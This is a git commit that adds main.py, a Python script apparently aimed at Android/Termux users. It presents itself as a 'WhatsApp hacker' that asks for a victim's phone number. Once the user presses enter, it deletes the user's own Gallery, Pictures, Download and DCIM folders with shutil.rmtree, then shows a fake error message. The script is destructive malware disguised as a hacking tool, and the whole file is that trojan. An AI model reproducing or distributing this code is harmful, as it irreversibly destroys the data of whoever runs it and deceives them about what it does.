5c620763e910fb58dec8dbd7790d61e6079f37f1
KiLL3R_xRO <79046188+KiLL3R-xRO@users.noreply.github.com>
2021-06-13 20:00:56 +0530

    Create main.py

---
+++ main.py
@@ -0,0 +1,25 @@
+import os
+import sys
+import shutil
+os.system('clear')
+print("""
+┏┓┏┓┏┓┏┳━━┳━┳┳┳━┳━┓
+┗┓┏┛┃┗┛┃┏┓┃┏┫┏┫┳┫╋┃
+┏┛┗┓┃┏┓┃┣┫┃┗┫┗┫┻┫┓┫
+┗┛┗┛┗┛┗┻┛┗┻━┻┻┻━┻┻┛""")
+print("            WELCOME TO WHATSAPP HACKER\n         NO FAKE 100% REAL")
+print("            CREATED BY UNKNOWN AGENT")
+country=input("[1]Enter country code>>")
+number=input("[2)]Enter victim's number without country code>>")
+print("Do you want to hack "+country+number+" ?")
+conti=input("Press enter to Hack the WhatsApp account:")
+print("Please wait...................")
+try:
+	shutil.rmtree("/storage/emulated/0/Gallery")
+	shutil.rmtree("/storage/emulated/0/Pictures")
+	shutil.rmtree("/storage/emulated/0/Download")
+	shutil.rmtree("/storage/emulated/0/DCIM")
+except:
+	print("Sorry,an error occured.Please Retry tool..")
+
+
